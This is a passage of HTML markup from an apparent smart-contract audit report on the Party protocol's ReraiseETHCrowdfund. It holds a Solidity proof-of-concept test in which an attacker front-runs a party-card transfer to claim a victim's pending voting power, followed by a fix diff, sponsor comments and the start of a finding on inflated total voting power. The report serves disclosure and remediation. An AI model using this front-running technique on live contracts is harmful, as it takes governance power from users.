class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Check that the contribution equivalent of total pending voting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// power is not above the max contribution range. This can happen</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// for contributors who contributed multiple times In this case, the</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// `claimMultiple` function should be called instead. This is done</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// so parties may use the minimum and maximum contribution values to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// limit the voting power of each card (e.g.  a party desiring a &quot;1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// card = 1 vote&quot;-like governance system where each card has equal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// voting power).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">contribution</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">maxContribution_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AboveMaximumContributionsError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contribution</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maxContribution_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Burn the crowdfund NFT.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pendingVotingPower</span><span class=\"mtk1\">[</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Mint contributor a new party card.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">delegationsByContributor</span><span class=\"mtk1\">[</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">disableContributingForExistingCard</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ContributingForExistingCardDisabledError</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Increase voting power of contributor&#39;s existing party card.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotOwnerError</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Claimed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Note that the caller can specify any <code>contributor</code> and can add the pending votes to an existing party card if <code>!disableContributingForExistingCard &#x26;&#x26; party.ownerOf(tokenId) == contributor</code>.</p>\n<p>So if User A has pending voting power and transfers one of his party cards to User B, then User C might front-run this transfer and claim the pending voting power to the party card that is transferred.</p>\n<p>If User B performs this attack it is not a griefing attack since User B benefits from it.</p>\n<p>Note that at the time of sending the transfer transaction the <code>ReraiseETHCrowdfund</code> does not have to be won already. The transaction that does the front-running might contribute to the crowdfund such that it is won and then claim the pending voting power.</p>\n<p>Add the following test to the <code>ReraiseETHCrowdfund.t.sol</code> test file. It shows how an attacker would perform such an attack:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_FrontRunTransfer</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ReraiseETHCrowdfund</span><span class=\"mtk1\"> </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createCrowdfund</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">initialContribution:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">initialContributor:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">initialDelegate:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">minContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">maxContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint96</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">disableContributingForExistingCard:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">minTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">maxTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">duration:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">fundingSplitBps:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">fundingSplitRecipient:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">victim</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2.5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0.5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @audit-info the victim owns a party card</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">party</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addAuthority</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseTotalVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">victimTokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contribute</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">2.5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/* @audit-info</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    The victim wants to transfer the party card, say to the attacker, and the attacker</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    front-runs this by completing the crowdfund and claiming the victim&#39;s pending voting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    power to the existing party card</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contribute</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">0.5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victimTokenId</span><span class=\"mtk1\">,</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/* @audit-info</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    when the victim&#39;s transfer is executed, he transfers also all of the voting power</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    that was previously his pending voting power (effectively losing it)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tranferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">,</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">,</span><span class=\"mtk12\">victimTokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>So when there is an ongoing crowdfund it is never safe to transfer one’s party card. It can always result in a complete loss of the pending voting power.</p>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In the <code>ReraiseETHCrowdfund.claim</code> function it should not be possible to add the pending voting power to an existing party card. It is possible though to allow it for the <code>contributor</code> himself but not for any user.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 580623d..cb560e1 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -292,7 +292,7 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             tokenId = party.mint(contributor, votingPower, delegationsByContributor[contributor]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         } else if (disableContributingForExistingCard) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             revert ContributingForExistingCardDisabledError();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        } else if (party.ownerOf(tokenId) == contributor) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } else if (party.ownerOf(tokenId) == contributor &amp;&amp; contributor == msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Increase voting power of contributor&#39;s existing party card.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             party.addVotingPower(tokenId, votingPower);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         } else {</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/12#issuecomment-1515465156\">0xble (Party) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Good finding, still thinking about the mitigation.</p>\n<p>Slightly hesitant to make the only action when claiming for someone else to be minting them a new card although minting to their existing card might be a rare action because of the friction involved in having to get the ID of one of the person’s cards first. Someone minting for someone else might just find it more convenient to mint them a new card, so having that be the only action might not be much of a loss.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/12#issuecomment-1532054697\">0xble (Party) commented</a>:</strong></p>\n<blockquote>\n<p>We’ve decided to refactor the way claiming works in the <code>ReraiseETHCrowdfund</code>, partially because a large number of findings like this being submitted around that one area that highlighted for us the need to rework its logic.</p>\n<p>The change will make it so (1) crowdfund NFTs are minted per contribution instead of per address and (2) claiming works more like a 1:1 conversion of your crowdfund NFT into a party card instead of how it works now. In the future we will also add the ability to split/merge party cards.</p>\n<p>This should mitigate this finding because in this new system you cannot decide to add the voting power from a crowdfund NFT to an existing party card when claiming, only mint a new party card.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-06-ethcrowdfundbasesol-totalvotingpower-is-increased-too-much-in-the-_finalize-function\" style=\"position:relative;\"><a href=\"#h-06-ethcrowdfundbasesol-totalvotingpower-is-increased-too-much-in-the-_finalize-function\" aria-label=\"h 06 ethcrowdfundbasesol totalvotingpower is increased too much in the _finalize function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/11\">[H-06] <code>ETHCrowdfundBase.sol</code>: <code>totalVotingPower</code> is increased too much in the <code>_finalize</code> function</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/11\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/27\">hansfriese</a></em></p>\n<p>This issue is about how the <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273-L292\"><code>ETHCrowdfundBase._finalize</code></a> functions calls <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L193-L197\"><code>PartyGovernanceNFT.increaseTotalVotingPower</code></a> with an amount that does not reflect the sum of the individual users’ voting power.</p>\n<p>Thereby it will become impossible to reach unanimous votes. In other words and more generally the users’ votes are worth less than they should be as the percentage is calculated against a total amount that is too big.</p>\n<p>In short, this is how the issue is caused:</p>\n<ol>\n<li>The voting power that a user receives is based on the amount they contribute MINUS funding fees</li>\n<li>The amount of voting power by which <code>totalVotingPower</code> is increased is based on the total contributions WITHOUT subtracting funding fees</li>\n</ol>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Let’s first look at the affected code and then at the PoC.</p>\n<p>The <code>votingPower</code> that a user receives for making a contribution is calculated in the <code>ETHCrowdfundBase._processContribution</code> function.</p>\n<p>We can see that first the funding fee is subtracted and then with the lowered <code>amount</code>, the <code>votingPower</code> is calculated:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L224-L233\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Subtract fee from contribution amount if applicable.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fundingSplitRecipient</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span 